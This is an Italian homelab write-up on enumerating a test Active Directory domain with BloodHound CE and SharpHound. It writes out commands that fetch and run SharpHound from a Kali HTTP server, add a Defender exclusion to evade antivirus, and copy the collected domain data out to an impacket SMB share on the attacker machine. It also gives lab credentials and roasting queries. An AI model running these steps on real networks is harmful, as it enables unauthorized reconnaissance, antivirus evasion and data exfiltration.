# 05 — BloodHound AD Enumeration

**Data:** 04/06/2026  
**Fase:** Phase 4 — Active Directory Lab  
**Obiettivo:** Enumerare il dominio `homelab.local` con BloodHound CE e SharpHound, analizzare attack paths  
**Tool usati:** bloodhound-python, SharpHound.exe, impacket-smbserver, BloodHound CE 9.1.0

---

## Contesto

BloodHound è uno strumento di enumerazione Active Directory che costruisce un grafo delle relazioni tra oggetti del dominio (utenti, gruppi, computer, ACL). Permette di identificare attack paths verso l'escalation di privilegi, inclusi percorsi non ovvi che sfruttano trust tra oggetti.

In questo lab viene usato BloodHound Community Edition (CE), non la versione legacy. Il collector ufficiale per CE è SharpHound.exe, che gira sul Windows target. bloodhound-python è il collector Python alternativo, ma ha limitazioni con LDAP signing abilitato.

---

## Tentativo 1 — bloodhound-python da Kali (fallito)

### Comando

```bash
python3 -m bloodhound \
  -u alice.rossi \
  -p 'Password123!' \
  -d homelab.local \
  -dc 10.10.10.10 \
  -c All \
  --zip
```

### Problema 1: DC non raggiungibile per hostname

```
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
Error: [Errno Connection error (DC01.homelab.local:88)] [Errno -2] Name or service not known
```

**Causa:** bloodhound-python tenta di risolvere il DC per FQDN via DNS. Il DNS di Kali non punta a `10.10.10.10`.

**Fix:** Specificare `--ns 10.10.10.10` e usare il FQDN:

```bash
python3 -m bloodhound \
  -u alice.rossi \
  -p 'Password123!' \
  -d homelab.local \
  -dc DC01.homelab.local \
  -ns 10.10.10.10 \
  -c All \
  --zip
```

### Problema 2: LDAP signing + SSL reset

```
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
ldap3.core.exceptions.LDAPSocketOpenError: socket ssl wrapping error: [Errno 104] Connection reset by peer
```

**Causa:** Windows Server 2025 ha LDAP Channel Binding abilitato di default. bloodhound-python tenta LDAPS ma il certificato self-signed di DC01 non viene accettato dall'handshake SSL su Kali.

**Soluzione adottata:** abbandonare bloodhound-python e usare SharpHound.exe direttamente su CLIENT01.

> **Nota:** Sarebbe risolvibile aggiungendo il certificato CA di DC01 al trust store di Kali, oppure usando `--disable-kerberos --auth-method ntlm` con alcune versioni di bloodhound-python. Nel contesto di questo lab si preferisce il metodo più realistico (collector su host Windows joined al dominio).

---

## Tentativo 2 — SharpHound.exe su CLIENT01, Defender attivo (fallito)

### Setup: HTTP server su Kali per delivery del binario

```bash
find /usr/share -name "SharpHound.exe" 2>/dev/null
# Output: /usr/share/sharphound/SharpHound.exe

cd /usr/share/sharphound/
python3 -m http.server 9000
```

### Download su CLIENT01 (PowerShell, utente alice.rossi)

```powershell
cd C:\temp
Invoke-WebRequest -Uri "http://10.10.10.100:9000/SharpHound.exe" -OutFile "SharpHound.exe"
.\SharpHound.exe -c All --zipfilename homelab-bh.zip
```

### Problema: Windows Defender blocca SharpHound

```
Impossibile eseguire il programma 'SharpHound.exe': Impossibile completare l'operazione.
Il file contiene un virus o software potenzialmente indesiderato.
CategoryInfo: ResourceUnavailable: (:) [], ApplicationFailedException
```

**Causa:** SharpHound.exe è riconosciuto come tool di enumerazione AD da Windows Defender. La firma del binario è nella definizione delle minacce.

---

## Soluzione — Bypass Defender + SharpHound su CLIENT01

### Step 1: Aggiungere esclusione AV (sessione admin su DC01 o CLIENT01)

Su una sessione PowerShell elevata (come `homelab\administrator`):

```powershell
Add-MpPreference -ExclusionPath "C:\temp"

# Verifica
Get-MpPreference | Select-Object ExclusionPath
# Output: {C:\temp}
```

> **Nota di sicurezza:** In un ambiente reale un attaccante con accesso admin locale può fare questo. In un pentest autorizzato su produzione questo step andrebbe documentato come "prerequisito" — è una tecnica di evasione AV, non una vulnerabilità di per sé.

### Step 2: Download e esecuzione SharpHound (sessione alice.rossi)

```powershell
cd C:\temp
Invoke-WebRequest -Uri "http://10.10.10.100:9000/SharpHound.exe" -OutFile "SharpHound.exe"
.\SharpHound.exe -c All --zipfilename homelab-bh.zip
```

### Output di SharpHound (successo)

```
[INFO] This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
[INFO] SharpHound Enumeration Completed at 19:20 on 04/06/2026! Happy Graphing!
[INFO] Status: 316 objects finished (+316 105.3333)/s — Using 80 MB RAM
[INFO] Enumeration finished in 00:00:03.4577000
[INFO] Saving cache with stats: 16 ID to type mappings.
      3 name to SID mappings.
      2 machine sid mappings.
      4 sid to domain mappings.
      0 global catalog mappings.
```

**316 oggetti enumerati** in ~3 secondi. File prodotto: `20260604192003_homelab-bh.zip` (33 KB).

---

## Exfiltration del file ZIP su Kali

### Tentativo 1: SMB share anonimo (fallito)

```powershell
copy C:\temp\20260604192003_homelab-bh.zip \\10.10.10.100\share\
```

```
Non puoi accedere a questa cartella condivisa perché i criteri di sicurezza dell'organizzazione
bloccano l'accesso guest non autenticato.
```

**Causa:** CLIENT01 (Windows 11) blocca l'accesso SMB guest per policy di sicurezza predefinita.

### Soluzione: impacket-smbserver con autenticazione SMB2

Su Kali:

```bash
mkdir -p /tmp/bh-data
sudo impacket-smbserver share /tmp/bh-data -smb2support
```

Su CLIENT01 (PowerShell):

```powershell
copy C:\temp\20260604192003_homelab-bh.zip \\10.10.10.100\share\
```

Il file viene copiato con successo in `/tmp/bh-data/` su Kali.

> **Perché SMB2?** Windows 11 e Server 2019+ richiedono SMB2 minimum. Il flag `-smb2support` forza impacket ad accettare negoziazioni SMB2, che altrimenti rifiuterebbe usando solo SMBv1.

---

## Import in BloodHound CE

### Upload

1. Aprire BloodHound CE: `http://127.0.0.1:8080`
2. Menu laterale → **Quick Upload** (oppure trascina file)
3. Selezionare il file da `/tmp/bh-data/20260604192003_homelab-bh.zip`
4. BloodHound elabora il JSON interno al ZIP e popola il database Neo4j

### Verifica import

Dopo l'upload:
- Sezione **Explore** → Search Nodes → cercare `HOMELAB.LOCAL`
- Verificare che utenti, computer, e gruppi siano presenti

---

## Analisi successiva (TODO)

Con i dati in BloodHound CE, le query di interesse per questo lab:

```cypher
-- Shortest path to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@HOMELAB.LOCAL"}))
RETURN p

-- Utenti con SPN (target Kerberoasting)
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames

-- AS-REP Roastable users
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name
```

---

## Snapshot

Dopo questa sessione:

| VM | Snapshot da creare |
|---|---|
| CLIENT01 | `02-client01-sharphound-bloodhound-ok` |
| Kali | `08-kali-bloodhound-data-imported` |

---

## Lessons Learned

| Problema | Causa | Fix |
|---|---|---|
| bloodhound-python LDAP signing error | LDAP Channel Binding default su WS2025 | Usare SharpHound su host joined al dominio |
| SharpHound bloccato da Defender | Firma binaria nota | Esclusione AV su C:\temp |
| SMB guest bloccato su Windows 11 | Policy sicurezza default | impacket-smbserver con -smb2support |
| Copia SMB senza autenticazione | Windows 11 richiede credenziali SMB | impacket accetta connessioni senza auth di default |

---

## Screenshot Notes — Italian UI Translations

The lab host runs Windows 11 and Kali with Italian locale.
Error messages in screenshots appear in Italian. Translations below.

### Windows PowerShell errors (CLIENT01)

| Italian (screenshot) | English translation |
|----------------------|---------------------|
| `Impossibile trovare il percorso 'C:\temp\homelab-bh.zip' perché non esiste` | Cannot find path 'C:\temp\homelab-bh.zip' because it does not exist |
| `Non puoi accedere a questa cartella condivisa perché i criteri di sicurezza dell'organizzazione bloccano l'accesso guest non autenticato` | Cannot access this shared folder because the organization's security policies block unauthenticated guest access |
| `Impossibile eseguire il programma 'SharpHound.exe': Impossibile completare l'operazione. Il file contiene un virus o software potenzialmente indesiderato` | Cannot run 'SharpHound.exe': Cannot complete the operation. The file contains a virus or potentially unwanted software |

### Windows Defender panel (Italian labels → English)

| Italian label | English equivalent |
|---------------|--------------------|
| Cronologia protezione | Protection history |
| Minaccia bloccata | Threat blocked |
| Minaccia in quarantena | Threat quarantined |
| Alta (severity) | High (severity) |

### Python/LDAP error (Kali terminal)

The traceback in the LDAP error screenshot is in English (Python output).
The warning line in Italian comes from the Windows DC response:

```
WARNING: LDAP Authentication is refused because LDAP signing is enabled.
```
This is English. The SSL error at the bottom is also English:
```
ldap3.core.exceptions.LDAPSocketOpenError: socket ssl wrapping error: [Errno 104] Connection reset by peer
```
No translation needed for these — they are standard library error messages.
